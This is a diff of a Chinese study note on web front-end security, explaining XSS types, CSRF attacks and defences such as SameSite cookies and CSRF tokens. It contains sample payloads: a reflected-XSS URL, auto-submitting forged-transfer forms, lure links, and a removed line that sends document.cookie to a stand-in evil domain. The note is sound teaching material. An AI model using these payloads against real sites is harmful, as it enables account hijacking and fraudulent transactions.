@@ -6,9 +6,18 @@ group:
 
 ## XSS:跨站脚本攻击
 
-XSS(跨站脚本攻击)就是攻击者想尽一切办法将可以执行的代码注入到网页中。
+XSS 全称是 Cross Site Scripting(即跨站脚本)，为了和 CSS 区分，故叫它 XSS。XSS 攻击是指浏览器中执行恶意脚本(无论是跨域还是同域)，从而拿到用户的信息并进行操作。
+
+这些操作一般可以完成下面这些事情:
+
+- 窃取 Cookie。
+- 监听用户行为，比如输入账号密码后直接发送到黑客服务器。
+- 修改 DOM 伪造登录表单。
+- 在页面中生成浮窗广告。
 
 ### 存储型（server 端）
+
+存储型，顾名思义就是将恶意脚本存储了起来，确实，存储型的 XSS 将脚本存储到了服务端的数据库，然后在客户端执行这些脚本，从而达到攻击的效果。
 
 场景：见于带有用户保存数据的网站功能，如论坛发帖、商品评论、用户私信等。
 
@@ -21,7 +30,16 @@ XSS(跨站脚本攻击)就是攻击者想尽一切办法将可以执行的代码
 
 ### 反射型（Server 端）
 
+反射型 XSS 指的是恶意脚本作为网络请求的一部分。
 与存储型的区别在于，存储型的恶意代码存储在数据库中，反射型的恶意代码在 `URL` 上
+
+```
+http://sanyuan.com?q=<script>alert("你完蛋了")</script>
+```
+
+这样，在服务器端会拿到 q 参数,然后将内容返回给浏览器端，浏览器将这些内容作为 HTML 的一部分解析，发现是一个脚本，直接执行，这样就被攻击了。
+
+之所以叫它反射型, 是因为恶意脚本是通过作为网络请求的参数，经过服务器，然后再反射到 HTML 文档中，执行解析。和存储型不一样的是，服务器并不会存储这些恶意脚本。
 
 场景：通过 `URL` 传递参数的功能，如网站搜索、跳转等。
 
@@ -61,9 +79,7 @@ DOM 型 XSS 攻击中，取出和执行恶意代码由浏览器端完成，属�
 
 ## CSRF：跨站请求伪造
 
-跨站点请求伪造（Cross-site request forgery）
-
-攻击者诱导受害者进入第三方网站，在第三方网站中，向被攻击网站发送跨站请求。利用受害者在被攻击网站已经获取的注册凭证，绕过后台的用户验证，达到冒充用户对被攻击的网站执行某项操作的目的。
+**跨站点请求伪造（Cross-site request forgery）** 攻击者诱导受害者进入第三方网站，在第三方网站中，向被攻击网站发送跨站请求。利用受害者在被攻击网站已经获取的注册凭证，绕过后台的用户验证，达到冒充用户对被攻击的网站执行某项操作的目的。
 
 攻击流程举例
 
@@ -74,39 +90,46 @@ DOM 型 XSS 攻击中，取出和执行恶意代码由浏览器端完成，属�
 5. a.com 以受害者的名义执行了 act=xx
 6. 攻击完成，攻击者在受害者不知情的情况下，冒充受害者，让 a.com 执行了自己定义的操作
 
-攻击类型
+### 发起 CSRF
 
-1. GET 型：如在页面的某个 img 中发起一个 get 请求
+1. 自动发 GET 请求
 
-   ```js
-   new Image().src =
-     'http://www.evil-domain.com/steal-cookie.php?cookie=' + document.cookie;
-   ```
+黑客网页里面可能有一段这样的代码:
 
-2. POST 型：通过自动提交表单到恶意网站
+```html
+<img src="https://xxx.com/info?user=hhh&count=100"></img>
+```
 
-   ```html
-   <form action="http://bank.example/withdraw" method="POST">
-     <input type="hidden" name="account" value="xiaoming" />
-     <input type="hidden" name="amount" value="10000" />
-     <input type="hidden" name="for" value="hacker" />
-   </form>
-   <script>
-     document.forms[0].submit();
-   </script>
-   ```
+进入页面后自动发送 get 请求，值得注意的是，这个请求会自动带上关于 xxx.com 的 cookie 信息(这里是假定你已经在 xxx.com 中登录过)。
 
-3. 链接型：需要诱导用户点击链接
-   ```html
-   <a
-     href="http://test.com/csrf/withdraw.php?amount=1000&for=hacker"
-     taget="_blank"
-   >
-     重磅消息！！
-   </a>
-   ```
+假如服务器端没有相应的验证机制，它可能认为发请求的是一个正常的用户，因为携带了相应的 cookie，然后进行相应的各种操作，可以是转账汇款以及其他的恶意操作。
 
-预防方案：
+2. 自动发 POST 请求
+
+黑客可能自己填了一个表单，写了一段自动提交的脚本。
+
+```html
+<form id="hacker-form" action="http://bank.example/withdraw" method="POST">
+  <input type="hidden" name="account" value="xiaoming" />
+  <input type="hidden" name="amount" value="10000" />
+  <input type="hidden" name="for" value="hacker" />
+</form>
+<script>
+  document.getElementById('hacker-form').submit();
+</script>
+```
+
+同样也会携带相应的用户 cookie 信息，让服务器误以为是一个正常的用户在操作，让各种恶意的操作变为可能。
+
+3. 诱导点击发送 GET 请求
+
+```html
+<a href="https://xxx/info?user=hhh&count=100" taget="_blank"
+  >点击进入修仙世界</a
+>
+```
+
+### 防范措施
 
 CSRF 通常从第三方网站发起，被攻击的网站无法防止攻击发生，只能通过增强自己网站针对 CSRF 的防护能力来提升安全性。
 
@@ -120,18 +143,19 @@ CSRF 通常从第三方网站发起，被攻击的网站无法防止攻击发生
 - CSRF Token
 - 双重 Cookie 验证
 
-### 同源检测
+#### 验证来源站点
 
-通过 `Header` 中的 `Origin Header` 、`Referer Header` 确定，但不同浏览器可能会有不一样的实现，不能完全保证
+通过请求头中的 `Origin` 、`Referer` 确定，当然，这两者都是可以伪造的，通过 Ajax 中自定义请求头即可，安全性略差。
 
-### Samesite Cookie
+#### SameSite Cookie
 
 Google 起草了一份草案来改进 HTTP 协议，那就是为 Set-Cookie 响应头新增 Samesite 属性，它用来标明这个 Cookie 是个“同站 Cookie”，同站 Cookie 只能作为第一方 Cookie，不能作为第三方 Cookie
 
-Samesite 有两个属性值
+SameSite 可以设置为三个值，Strict、Lax 和 None。
 
-- `Strict`: 为任何情况下都不可以作为第三方 Cookie
-- `Lax`: 为可以作为第三方 Cookie , 但必须是 Get 请求
+- 在 Strict 模式下，浏览器完全禁止第三方请求携带 Cookie。比如请求 sanyuan.com 网站只能在 sanyuan.com 域名当中请求才能携带 Cookie，在其他网站请求都不能。
+- 在 Lax 模式，就宽松一点了，但是只能在 get 方法提交表单况或者 a 标签发送 get 请求的情况下可以携带 Cookie，其他情况均不能。
+- 在 None 模式下，也就是默认模式，请求会自动携带上 Cookie。
 
 在敏感 cookie 上携带属性 Samesite：Strict 或 Lax，可以避免在第三方不同域网站上携带 cookie
 
@@ -139,7 +163,17 @@ Samesite 有两个属性值
 
 首先服务器生成一个动态的 token，传给用户，用户再次提交或者请求敏感操作时，携带此 token，服务端校验通过才返回正确结果。
 
-### 双重 cookie
+Django 作为 Python 的一门后端框架，用它开发过的同学就知道，在它的模板(template)中, 开发表单时，经常会附上这样一行代码:
+
+```
+{% csrf_token %}
+```
+
+这就是 CSRF Token 的典型应用。那它的原理是怎样的呢？
+
+首先，浏览器向服务器发送请求时，服务器生成一个字符串，将其植入到返回的页面中。
+
+然后浏览器如果要发送请求，就必须带上这个字符串，然后服务器来验证是否合法，如果不合法则不予响应。这个字符串也就是 CSRF Token，通常第三方站点无法拿到这个 token, 因此也就是被服务器给拒绝。
 
 流程
 
@@ -181,10 +215,6 @@ Samesite 有两个属性值
 3. 设置 CSP 即 `Content-Security-Policy` 请求头
 4. 减少对 iframe 的使用
 
-## 第三方依赖包
-
-减少对第三方依赖包的使用，如之前 npm 的包如：event-stream 被爆出恶意攻击数字货币；
-
 ## HTTPS
 
 描述：
@@ -194,10 +224,6 @@ Samesite 有两个属性值
 使用 HSTS（HTTP Strict Transport Security），它通过下面这个 HTTP `Header` 以及一个预加载的清单，来告知浏览器和网站进行通信的时候强制性的使用 HTTPS，而不是通过明文的 HTTP 进行通信。这里的“强制性”表现为浏览器无论在何种情况下都直接向务器端发起 HTTPS 请求，而不再像以往那样从 HTTP 跳转到 HTTPS。另外，当遇到证书或者链接不安全的时候，则首先警告用户，并且不再
 用户选择是否继续进行不安全的通信。
 
-## 本地存储数据
-
-避免重要的用户信息存在浏览器缓存中
-
 ## 静态资源完整性校验
 
 描述
@@ -205,17 +231,6 @@ Samesite 有两个属性值
 
 预防方案
 将使用 base64 编码过后的文件哈希值写入你所引用的 `<script>` 或 标签的 integrity 属性值中即可启用子资源完整性能。
-
-## 网络劫持
-
-描述：
-
-- DNS 劫持（涉嫌违法）：修改运行商的 DNS 记录，重定向到其他网站。DNS 劫持是违法的行为，目前 DNS 劫持已被监管，现在很少见 DNS 劫持
-- HTTP 劫持：前提有 HTTP 请求。因 HTTP 是明文传输，运营商便可借机修改 HTTP 响应内容（如加广告）。
-
-预防方案
-
-全站 HTTPS
 
 ## 中间人攻击
 
@@ -261,33 +276,3 @@ Samesite 有两个属性值
 - 确认你访问的 URL 是 HTTPS 的，确保网站使用了 SSL，确保禁用一些不安全的 SSL，只开启：TLS1.1，TLS1.2
 - 不要使用公用网络发送一些敏感的信息
 - 不要去点击一些不安全的连接或者恶意链接或邮件信息
-
-## sql 注入
-
-通过把 SQL 命令插入到 Web 表单递交或输入域名或页面请求的查询字符串，最终达到欺骗数据库服务器执行恶意的 SQL 命令,从而达到和服务器
-进行直接的交互
-
-预防方案：
-
-1. 后台进行输入验证，对敏感字符过滤。
-2. 使用参数化查询，能避免拼接 SQL，就不要拼接 SQL 语句。
-
-## 前端数据安全：
-
-反爬虫。如猫眼电影、天眼查等等，以数据内容为核心资产的企业
-
-预防方案：
-
-- font-face 拼接方式：猫眼电影、天眼查
-- background 拼接：美团
-- 伪元素隐藏：汽车之家
-- 元素定位覆盖式：去哪儿
-- iframe 异步加载：网易云音乐
-
-## 其他建议
-
-- 定期请第三方机构做安全性测试，漏洞扫描
-- 使用第三方开源库做上线前的安全测试，可以考虑融合到 CI 中
-- code review 保证代码质量
-- 默认项目中设置对应的 `Header` 请求头，如 X-XSS-Protection、 X-Content-Type-Options 、X-Frame-Options `Header`、Content-Security-Policy 等等
-- 对第三方包和库做检测：NSP(Node Security Platform)，Snyk
